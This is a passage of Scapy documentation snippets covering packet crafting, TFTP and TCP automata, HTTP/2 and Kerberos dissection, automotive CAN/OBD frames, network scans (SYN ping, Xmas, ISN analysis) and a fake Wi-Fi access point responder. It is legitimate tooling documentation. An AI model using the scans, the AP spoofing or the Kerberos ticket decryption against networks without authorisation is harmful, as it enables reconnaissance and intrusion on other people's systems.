pass\n\n    @ATMT.receive_condition(WAITING)\n    def receive_data(self, pkt):\n        if TFTP_DATA in pkt and pkt[TFTP_DATA].block == self.awaiting:\n            if self.server_tid is None:\n                self.server_tid = pkt[UDP].sport\n                self.l3[UDP].dport = self.server_tid\n            raise self.RECEIVING(pkt)\n    @ATMT.action(receive_data)\n    def send_ack(self):\n        self.last_packet = self.l3 / TFTP_ACK(block = self.awaiting)\n        self.send(self.last_packet)\n\n    @ATMT.receive_condition(WAITING, prio=1)\n    def receive_error(self, pkt):\n        if TFTP_ERROR in pkt:\n            raise self.ERROR(pkt)\n\n    @ATMT.timeout(WAITING, 3)\n    def timeout_waiting(self):\n        raise self.WAITING()\n    @ATMT.action(timeout_waiting)\n    def retransmit_last_packet(self):\n        self.send(self.last_packet)\n\n    # RECEIVED\n    @ATMT.state()\n    def RECEIVING(self, pkt):\n        recvd = pkt[Raw].load\n        self.res += recvd\n        self.awaiting += 1\n        if len(recvd) == self.blocksize:\n            raise self.WAITING()\n        raise self.END()\n\n    # ERROR\n    @ATMT.state(error=1)\n    def ERROR(self,pkt):\n        split_bottom_up(UDP, TFTP, dport=self.my_tid)\n        return pkt[TFTP_ERROR].summary()\n    \n    #END\n    @ATMT.state(final=1)\n    def END(self):\n        split_bottom_up(UDP, TFTP, dport=self.my_tid)\n        return self.res\n```\n\n----------------------------------------\n\nTITLE: Creating a Wi-Fi Probe Request Answering Machine in Scapy\nDESCRIPTION: This example creates an answering machine that responds to Wi-Fi probe requests, simulating the existence of a fake access point named 'Scapy !'. It requires the Wi-Fi interface to be in monitor mode.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\n# Specify the Wi-Fi monitor interface\n#conf.iface = \"mon0\"  # uncomment to test\n\n# Create an answering machine\nclass ProbeRequest_am(AnsweringMachine):\n  function_name = \"pram\"\n\n  # The fake mac of the fake access point\n  mac = \"00:11:22:33:44:55\"\n\n  def is_request(self, pkt):\n    return Dot11ProbeReq in pkt\n\n  def make_reply(self, req):\n\n    rep = RadioTap()\n    # Note: depending on your Wi-Fi card, you might need a different header than RadioTap()\n    rep /= Dot11(addr1=req.addr2, addr2=self.mac, addr3=self.mac, ID=RandShort(), SC=RandShort())\n    rep /= Dot11ProbeResp(cap=\"ESS\", timestamp=time.time())\n    rep /= Dot11Elt(ID=\"SSID\",info=\"Scapy !\")\n    rep /= Dot11Elt(ID=\"Rates\",info=b'\\x82\\x84\\x0b\\x16\\x96')\n    rep /= Dot11Elt(ID=\"DSset\",info=chr(10))\n\n    return rep\n\n# Start the answering machine\n#ProbeRequest_am()()  # uncomment to test\n```\n\n----------------------------------------\n\nTITLE: Processing HTTP/2 Stream Frames\nDESCRIPTION: Processes received HTTP/2 frames by type - converting headers to text representation and buffering data frames. Uses dictionaries to store stream headers and data separately.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_28\n\nLANGUAGE: python\nCODE:\n```\n# Structure used to store textual representation of the stream headers\nstream_txt = {}\n# Structure used to store data from each stream\nstream_data = {}\n\n# For each frame we previously received\nfor frame in stream.frames:\n    # If this frame is a header\n    if frame.type == h2.H2HeadersFrame.type_id:\n        # Convert this header block into its textual representation.\n        # For the sake of simplicity of this tutorial, we assume \n        # that the header block is not large enough to require a Continuation frame\n        stream_txt[frame.stream_id] = srv_tblhdr.gen_txt_repr(frame)\n    # If this frame is data\n    if frame.type == h2.H2DataFrame.type_id:\n        if frame.stream_id not in stream_data:\n            stream_data[frame.stream_id] = []\n        stream_data[frame.stream_id].append(frame)\n```\n\n----------------------------------------\n\nTITLE: Decrypting Kerberos Encrypted Data with AES256 in Python\nDESCRIPTION: This snippet demonstrates how to decrypt encrypted data from a Kerberos packet using the Key class from scapy.libs.rfc3961. It creates a Key object with AES256 encryption type and a provided hex key, then uses it to decrypt the encrypted data.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\n>>> from scapy.libs.rfc3961 import Key, EncryptionType\n>>> enc = pkt[Kerberos].root.padata[0].padataValue\n>>> k = Key(EncryptionType.AES256_CTS_HMAC_SHA1_96, key=bytes.fromhex(\"7fada4e566ae4fb270e2800a23ae87127a819d42e69b5e22de0ddc63da80096d\"))\n\n>>> enc.decrypt(k)\n<PA_ENC_TS_ENC  patimestamp=2022-07-15 17:18:47 UTC <ASN1_GENERALIZED_TIME['20220715171847Z']> pausec=0x9a4db <ASN1_INTEGER[632027]> |>\n```\n\n----------------------------------------\n\nTITLE: Sending and Receiving CAN Messages Over Vector Interface with Scapy\nDESCRIPTION: Shows configuration for using Scapy with Vector CAN interfaces by setting the python-can backend, creating a CANSocket with Vector bustype, and performing basic send and receive operations.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nload_layer(\"can\")\nconf.contribs['CANSocket'] = {'use-python-can' : True}\nload_contrib('cansocket')\n\nsocket = CANSocket(bustype='vector', channel=0, bitrate=1000000)\npacket = CAN(identifier=0x123, data=b'01020304')\n\nsocket.send(packet)\nrx_packet = socket.recv()\n\nsocket.sr1(packet)\n```\n\n----------------------------------------\n\nTITLE: Import and Export of CAN Frames with Scapy\nDESCRIPTION: Shows how to write CAN frames to pcap files using wrpcap() and read them back using rdpcap(). Also demonstrates importing CAN messages from candump log files using the CandumpReader class with sniff().\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nx = CAN(identifier=0x7ff,length=8,data=b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08')\nwrpcap('/tmp/scapyPcapTest.pcap', x, append=False)\ny = rdpcap('/tmp/scapyPcapTest.pcap', 1)\n\nwith CandumpReader(\"candump.log\") as sock:\n    can_msgs = sniff(count=50, opened_socket=sock)\n```\n\n----------------------------------------\n\nTITLE: Processing and Displaying HTTP/2 Headers and Data in Scapy\nDESCRIPTION: This code extracts text representation of HTTP/2 headers from a frame and decompresses HTTP/2 data content. It first generates a text representation of the headers from the first frame, then concatenates data from subsequent frames before decompressing it with zlib to render HTML content.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_50\n\nLANGUAGE: python\nCODE:\n```\nstream_txt = srv_tblhdr.gen_txt_repr(h2seq.frames[0])\ndata = ''\nfor frgmt in h2seq.frames[1:]:\n    data += frgmt.payload.data\nprint(stream_txt)\nHTML(zlib.decompress(data, 16+zlib.MAX_WBITS).decode(\"utf-8\", \"ignore\"))\n```\n\n----------------------------------------\n\nTITLE: Creating Implicit Packets in Python\nDESCRIPTION: Shows how to create implicit packets with varying TTL values using Scapy's list comprehension feature.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n[p for p in IP(ttl=(1,5))/ICMP()]\n```\n\n----------------------------------------\n\nTITLE: Accessing Packet Fields in Python\nDESCRIPTION: Demonstrates how to access and display various fields of a packet using Scapy's field access and sprintf() method.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nprint(p.dst)  # first layer that has an src field, here Ether\nprint(p[IP].src)  # explicitly access the src field of the IP layer\n\n# sprintf() is a useful method to display fields\nprint(p.sprintf(\"%Ether.src% > %Ether.dst%\\n%IP.src% > %IP.dst%\"))\n```\n\n----------------------------------------\n\nTITLE: TCP SYN Ping Scanning\nDESCRIPTION: Conducts TCP SYN ping scanning as an alternative when ICMP is blocked.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_41\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr( IP(dst=\"192.168.1.0/24\")/TCP(dport=80,flags=\"S\") )\nans.summary( lambda s,r : r.sprintf(\"%IP.src% is alive\") )\n```\n\n----------------------------------------\n\nTITLE: Analyzing HTTP/2 Headers Frame Structure in Scapy\nDESCRIPTION: Detailed breakdown of a HTTP/2 Headers Frame showing its structure including length, type, flags, and stream ID. The frame contains header information exchanged during HTTP/2 communication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\n###[ HTTP/2 Frame ]### \n  len       = 0x167\n  type      = HdrsFrm\n  flags     = set(['End Headers (EH)'])\n  reserved  = 0L\n  stream_id = 1L\n###[ HTTP/2 Headers Frame ]### \n     \\hdrs      \\\n      |###[ HPack Indexed Header Field ]### \n      |  magic     = 1\n      |  index     = 8\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 33\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 22\n      |   |  data      = 'HPackZString(Tue, 13 Dec 2016 17:34:51 GMT)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 36\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Literal\n      |   |  len       = 2\n      |   |  data      = 'HPackLiteralString(-1)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 24\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 13\n      |   |  data      = 'HPackZString(private, max-age=0)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 31\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 22\n      |   |  data      = 'HPackZString(text/html; charset=ISO-8859-1)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 0\n      |  \\hdr_name  \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Literal\n      |   |  len       = 3\n      |   |  data      = 'HPackLiteralString(p3p)'\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 81\n      |   |  data      = 'HPackZString(CP=\"This is not a P3P policy! See https://www.google.com/support/accounts/answer/151657?hl=en for more info.\")'\n      |###[ HPack Indexed Header Field ]### \n      |  magic     = 1\n      |  index     = 78\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 54\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Literal\n      |   |  len       = 3\n      |   |  data      = 'HPackLiteralString(gws)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 28\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 3\n      |   |  data      = 'HPackZString(4420)'\n      |###[ HPack Indexed Header Field ]### \n      |  magic     = 1\n      |  index     = 72\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 0\n      |  \\hdr_name  \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 11\n      |   |  data      = 'HPackZString(x-frame-options)'\n```\n\n----------------------------------------\n\nTITLE: Analyzing ISN (Initial Sequence Number) with Scapy in Python\nDESCRIPTION: This code snippet shows how to use Scapy to analyze ISN increments, which can potentially discover vulnerable systems. It sends SYN probes in a loop and then analyzes the sequence numbers in the responses.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_54\n\nLANGUAGE: python\nCODE:\n```\nans, unans = srloop(IP(dst=\"192.168.1.1\")/TCP(dport=80,flags=\"S\"))\n```\n\nLANGUAGE: python\nCODE:\n```\ntemp = 0\nfor s, r in ans:\n   temp = r[TCP].seq - temp\n   print(\"%d\\t+%d\" % (r[TCP].seq, temp))\n```\n\n----------------------------------------\n\nTITLE: OBD Request for Supported PIDs in Python using Scapy\nDESCRIPTION: This snippet demonstrates how to create an OBD request for supported PIDs of service 0x01 using Scapy. It shows the structure of the request and how to interpret the response.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_35\n\nLANGUAGE: Python\nCODE:\n```\nreq = OBD()/OBD_S01(pid=[0x00])\nresp = OBD()/OBD_S01_PR(data_records=[OBD_S01_PR_Record()/OBD_PID00(supported_pids=3196041235)])\nresp.show()\n```\n\n----------------------------------------\n\nTITLE: Creating and Sending a SOME/IP Message in Python using Scapy\nDESCRIPTION: This snippet demonstrates how to create and send a SOME/IP message requesting service 0x1234 with method 0x421 using Scapy. It includes creating UDP and IP packages, configuring the SOME/IP message, and sending the packet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_33\n\nLANGUAGE: Python\nCODE:\n```\nload_contrib('automotive.someip')\n\nu = UDP(sport=30509, dport=30509)\ni = IP(src=\"192.168.0.13\", dst=\"192.168.0.10\")\nsip = SOMEIP()\nsip.iface_ver = 0\nsip.proto_ver = 1\nsip.msg_type = \"REQUEST\"\nsip.retcode = \"E_OK\"\nsip.srv_id = 0x1234\nsip.method_id = 0x421\nsip.add_payload(Raw (\"Hello\"))\np = i/u/sip\nsend(p)\n```\n\n----------------------------------------\n\nTITLE: ARP Ping Network and Generate LaTeX Table with Scapy in Python\nDESCRIPTION: This script performs an ARP ping on a specified network and generates a LaTeX-formatted table of the results. It demonstrates more advanced usage of Scapy for network scanning and output formatting.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/extending.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n#! /usr/bin/env python\n# arping2tex : arpings a network and outputs a LaTeX table as a result\n\nimport sys\nif len(sys.argv) != 2:\n    print(\"Usage: arping2tex <net>\\n  eg: arping2tex 192.168.1.0/24\")\n    sys.exit(1)\n\nfrom scapy.all import srp, Ether, ARP, conf\nconf.verb = 0\nans, unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(pdst=sys.argv[1]),\n                 timeout=2)\n\nprint(r\"\\begin{tabular}{|l|l|}\")\nprint(r\"\\hline\")\nprint(r\"MAC & IP\\\\\")\nprint(r\"\\hline\")\nfor snd,rcv in ans:\n    print(rcv.sprintf(r\"%Ether.src% & %ARP.psrc%\\\\\"))\nprint(r\"\\hline\")\nprint(r\"\\end{tabular}\")\n```\n\n----------------------------------------\n\nTITLE: Defining a Simple Protocol Layer in Python\nDESCRIPTION: This snippet demonstrates how to create a basic protocol layer in Scapy by subclassing Packet and defining fields_desc with various field types.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nclass Disney(Packet): \n    name = \"DisneyPacket \" \n    fields_desc=[ ShortField(\"mickey\",5), \n                 XByteField(\"minnie\",3) , \n                 IntEnumField(\"donald\" , 1 , \n                      { 1: \"happy\", 2: \"cool\" , 3: \"angry\" } ) ]\n```\n\n----------------------------------------\n\nTITLE: Sniffing Packets on Multiple Interfaces in Python with Scapy\nDESCRIPTION: Demonstrates using Scapy's sniff() function to capture packets on multiple network interfaces simultaneously. The lambda function prints the interface name and packet summary for each captured packet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nsniff(iface=[\"eth1\",\"eth2\"], prn=lambda x: x.sniffed_on+\": \"+x.summary())\n```\n\n----------------------------------------\n\nTITLE: Getting Interface IP Address in Scapy\nDESCRIPTION: Shows how to retrieve the IP address of a network interface using Scapy's get_if_addr() function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> ip = get_if_addr(conf.iface)  # default interface\n>>> ip = get_if_addr(\"eth0\")\n>>> ip\n'10.0.0.5'\n```\n\n----------------------------------------\n\nTITLE: Packet Visualization and Analysis in Python\nDESCRIPTION: Demonstrates various methods to visualize and analyze packets in Scapy, including raw bytes, summary, hexdump, and detailed dissection.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\npkt = IP() / UDP() / DNS(qd=DNSQR())\nprint(repr(raw(pkt)))\nprint(pkt.summary())\nhexdump(pkt)\npkt.show()\npkt.canvas_dump()\n```\n\n----------------------------------------\n\nTITLE: Creating and Stacking Network Layers in Python\nDESCRIPTION: Shows how to create and stack different network layers (IP, TCP, Ethernet) using Scapy's layer binding operator '/'.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\npacket = IP()/TCP()\nEther()/packet\n```\n\n----------------------------------------\n\nTITLE: Implementing do_build() Method in Python for Scapy Packet Building\nDESCRIPTION: This snippet shows the implementation of the do_build() method, which is responsible for building each field of a layer in a Scapy packet. It iterates through the fields_desc list and calls addfield() for each field.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_11\n\nLANGUAGE: Python\nCODE:\n```\ndef do_build(self):\n    p=\"\"\n    for f in self.fields_desc:\n        p = f.addfield(self, p, self.getfieldval(f))\n    return p\n```\n\n----------------------------------------\n\nTITLE: Constructing Netflow V9 Packet with Template and Data in Python using Scapy\nDESCRIPTION: This complex snippet illustrates the creation of a Netflow V9 packet, including both template and data flowsets. It defines a custom template with specific fields, generates a record class based on the template, and then creates data records. The packet is constructed with Ethernet, IP, and UDP headers, followed by Netflow-specific components.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/netflow.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nheader = Ether()/IP()/UDP()\nnetflow_header = NetflowHeader()/NetflowHeaderV9()\n\n# Let's first build the template. Those need an ID > 255.\n# The (full) list of possible fieldType is available in the\n# NetflowV910TemplateFieldTypes list. You can also use the int value.\nflowset = NetflowFlowsetV9(\n    templates=[NetflowTemplateV9(\n        template_fields=[\n            NetflowTemplateFieldV9(fieldType=\"IN_BYTES\", fieldLength=1),\n            NetflowTemplateFieldV9(fieldType=\"IN_PKTS\", fieldLength=4),\n            NetflowTemplateFieldV9(fieldType=\"PROTOCOL\"),\n            NetflowTemplateFieldV9(fieldType=\"IPV4_SRC_ADDR\"),\n            NetflowTemplateFieldV9(fieldType=\"IPV4_DST_ADDR\"),\n        ],\n        templateID=256,\n        fieldCount=5)\n    ],\n    flowSetID=0\n)\n# Let's generate the record class. This will be a Packet class\n# In case you provided several templates in ghe flowset, you will need\n# to pass the template ID as second parameter\nrecordClass = GetNetflowRecordV9(flowset)\n# Now lets build the data records\ndataFS = NetflowDataflowsetV9(\n    templateID=256,\n    records=[ # Some random data.\n        recordClass(\n            IN_BYTES=b\"\\x12\",\n            IN_PKTS=b\"\\0\\0\\0\\0\",\n            PROTOCOL=6,\n            IPV4_SRC_ADDR=\"192.168.0.10\",\n            IPV4_DST_ADDR=\"192.168.0.11\"\n        ),\n        recordClass(\n            IN_BYTES=b\"\\x0c\",\n            IN_PKTS=b\"\\1\\1\\1\\1\",\n            PROTOCOL=3,\n            IPV4_SRC_ADDR=\"172.0.0.10\",\n            IPV4_DST_ADDR=\"172.0.0.11\"\n        )\n    ],\n)\npkt = header / netflow_header / flowset / dataFS\n```\n\n----------------------------------------\n\nTITLE: OBD Request for Specific PID in Python using Scapy\nDESCRIPTION: This example shows how to create an OBD request for a specific PID (0x15) and interpret the response using Scapy. It demonstrates the structure of the request and response for a particular parameter.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_36\n\nLANGUAGE: Python\nCODE:\n```\nreq = OBD()/OBD_S01(pid=[0x15])\nresp = sock.sr1(req)\nresp.show()\n```\n\n----------------------------------------\n\nTITLE: Converting Packets to Binary Strings in Scapy\nDESCRIPTION: Shows how to convert packets to raw binary strings using raw() function and reconstruct them back into packet objects. This is useful for binary-level packet manipulation and storage.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_29\n\nLANGUAGE: Python\nCODE:\n```\n>>> pkt_raw = raw(pkt)\n>>> new_pkt = Ether(pkt_raw)\n```\n\n----------------------------------------\n\nTITLE: Creating a TCP Scanner Automaton with Scapy\nDESCRIPTION: This example demonstrates how to create an automaton in Scapy to mimic a TCP scanner. It defines states, conditions, and actions for the scanning process.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\nclass TCPScanner(Automaton):\n\n    @ATMT.state(initial=1)\n    def BEGIN(self):\n        pass\n\n    @ATMT.state()\n    def SYN(self):\n        print(\"-> SYN\")\n\n    @ATMT.state()\n    def SYN_ACK(self):\n        print(\"<- SYN/ACK\")\n        raise self.END()\n\n    @ATMT.state()\n    def RST(self):\n        print(\"<- RST\")\n        raise self.END()\n\n    @ATMT.state()\n    def ERROR(self):\n        print(\"!! ERROR\")\n        raise self.END()\n    @ATMT.state(final=1)\n    def END(self):\n        pass\n    \n    @ATMT.condition(BEGIN)\n    def condition_BEGIN(self):\n        raise self.SYN()\n\n    @ATMT.condition(SYN)\n    def condition_SYN(self):\n\n        if random.randint(0, 1):\n            raise self.SYN_ACK()\n        else:\n            raise self.RST()\n\n    @ATMT.timeout(SYN, 1)\n    def timeout_SYN(self):\n        raise self.ERROR()\n\nTCPScanner().run()\n```\n\n----------------------------------------\n\nTITLE: Creating Standard and Extended CAN Frames in Scapy\nDESCRIPTION: Demonstrates how to create both standard CAN frames with 11-bit IDs and extended CAN frames with 29-bit IDs using Scapy's CAN class. Includes example of frame inspection with .show() method.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> load_layer(\"can\")\n>>> frame = CAN(identifier=0x200, length=8, data=b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08')\n\nframe = CAN(flags='extended', identifier=0x10010000, length=8, data=b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08')\n>>> frame.show()\n###[ CAN ]###\n  flags= extended\n  identifier= 0x10010000\n  length= 8\n  reserved= 0\n  data= '\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08'\n```\n\n----------------------------------------\n\nTITLE: Xmas Scan with Scapy\nDESCRIPTION: Implements a Xmas scan by sending TCP packets with FIN, PUSH and URG flags set. Used to detect closed ports on the target system.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_37\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr(IP(dst=\"192.168.1.1\")/TCP(dport=666,flags=\"FPU\"))\n```\n\n----------------------------------------\n\nTITLE: Using Scapy Pipes for Packet Processing\nDESCRIPTION: This snippet demonstrates how to use Scapy's pipes feature for packet processing. It combines CLIFeeder and InjectSink to send messages from the Python command line to a network interface.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\n# Instantiate the blocks\nclf = CLIFeeder()\nijs = InjectSink(\"enx3495db043a28\")\n\n# Plug blocks together\nclf > ijs\n\n# Create and start the engine\npe = PipeEngine(clf)\npe.start()\n```\n\n----------------------------------------\n\nTITLE: Accessing Scapy's Interface List in Python\nDESCRIPTION: Demonstrates how to access and query Scapy's interface list using the conf.ifaces object and its utility functions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.ifaces\nSource  Index  Name  MAC                IPv4          IPv6\nsys     1      lo    00:00:00:00:00:00  127.0.0.1     ::1\nsys     2      eth0  Microsof:12:cb:ef  10.0.0.5  fe80::10a:2bef:dc12:afae\n>>> conf.ifaces.dev_from_index(2)\n<NetworkInterface eth0 [UP+BROADCAST+RUNNING+SLAVE]>\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom HTTP Server in Scapy\nDESCRIPTION: Shows how to create a custom HTTP server using Scapy's HTTP_Server class. The example defines a custom answer method to handle different paths and return appropriate responses.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.http import *\nfrom scapy.layers.ntlm import *\n\nclass Custom_HTTP_Server(HTTP_Server):\n    def answer(self, pkt):\n        if pkt.Path == b\"/\":\n            return HTTPResponse() / (\n                \"<!doctype html><html><body><h1>OK</h1></body></html>\"\n            )\n        else:\n            return HTTPResponse(\n                Status_Code=b\"404\",\n                Reason_Phrase=b\"Not Found\",\n            ) / (\n                \"<!doctype html><html><body><h1>404 - Not Found</h1></body></html>\"\n            )\n\nserver = HTTP_Server.spawn(\n    port=8080,\n    iface=\"eth0\",\n)\n```\n\n----------------------------------------\n\nTITLE: Filtering and Formatting Packet Capture with Scapy\nDESCRIPTION: Shows how to use BPF filters and Scapy's sprintf() method together to capture specific packets and format their output. This example captures TCP packets on ports 25 and 110, formatting the output to show IP addresses, ports, TCP flags, and payload.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\na=sniff(filter=\"tcp and ( port 25 or port 110 )\",\n prn=lambda x: x.sprintf(\"%IP.src%:%TCP.sport% -> %IP.dst%:%TCP.dport%  %2s,TCP.flags% : %TCP.payload%\"))\n```\n\n----------------------------------------\n\nTITLE: Reading HTTP/2 Server Settings with Scapy in Python\nDESCRIPTION: Uses Scapy's SSLStreamSocket to wrap the SSL connection and receive the server's HTTP/2 settings frame.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nimport scapy.supersocket as supersocket\nimport scapy.contrib.http2 as h2\nimport scapy.config\nscapy.config.conf.debug_dissector = True\nss = supersocket.SSLStreamSocket(ssl_sock, basecls=h2.H2Frame)\nsrv_set = ss.recv()\nsrv_set.show()\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Routing in Scapy\nDESCRIPTION: Demonstrates how to manipulate Scapy's internal routing table for custom packet routing. Allows routing packets differently from the system's routing table.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_32\n\nLANGUAGE: Python\nCODE:\n```\n>>> conf.route.delt(net=\"0.0.0.0/0\",gw=\"192.168.8.1\")\n>>> conf.route.add(net=\"0.0.0.0/0\",gw=\"192.168.8.254\")\n```\n\n----------------------------------------\n\nTITLE: Decrypting Kerberos EncTicketPart with Scapy in Python\nDESCRIPTION: This code extracts the encrypted ticket part from a Kerberos packet, decrypts it using the KRBTGT key, and displays the decrypted EncTicketPart structure. It demonstrates how to access nested fields in Scapy packet structures.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nenc = pkt.root.padata[0].padataValue.armoredData.armor.armorValue.ticket.encPart\nencticketpart = enc.decrypt(krbtgt)\nencticketpart.show()\n```\n\n----------------------------------------\n\nTITLE: Decrypting Kerberos Packets in Python\nDESCRIPTION: This snippet shows how to decrypt and analyze a Kerberos packet using Scapy. It demonstrates packet creation and inspection of the Kerberos payload.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\n>>> pkt = Ether(b\"RT\\x00iX\\x13RT\\x00!l+\\x08\\x00E\\x00\\x01]\\xa7\\x18@\\x00\\x80\\x06\\xdc\\x83\\xc0\\xa8z\\x9c\\xc0\\xa8z\\x11\\xc2\\t\\x00XT\\xf6\\xab#\\x92\\xc2[\\xd6P\\x18 